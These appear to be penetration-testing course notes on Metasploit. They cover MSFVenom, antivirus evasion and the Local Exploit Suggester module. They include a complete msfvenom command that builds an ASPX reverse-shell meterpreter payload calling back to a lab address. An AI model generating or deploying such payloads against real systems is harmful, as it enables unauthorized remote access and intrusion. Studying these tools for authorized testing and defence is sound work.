- `MSFVenom` is the successor of `MSFPayload` and `MSFEncode`, two stand-alone scripts that used to work in conjunction with `msfconsole` **to provide users with highly customizable and hard-to-detect payloads for their exploits.**
- The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. **`Heuristic analysis, machine learning, and deep packet inspection` make it much harder for a payload to run** through several subsequent iterations of an encoding scheme to evade any good AV software.

# Creating Our Payloads
---
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`

# Local Exploit Suggester
---
- As a tip, there is a module called the `Local Exploit Suggester`.
- Having these results in front of us, we can easily pick one of them to test out. **==If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same.==**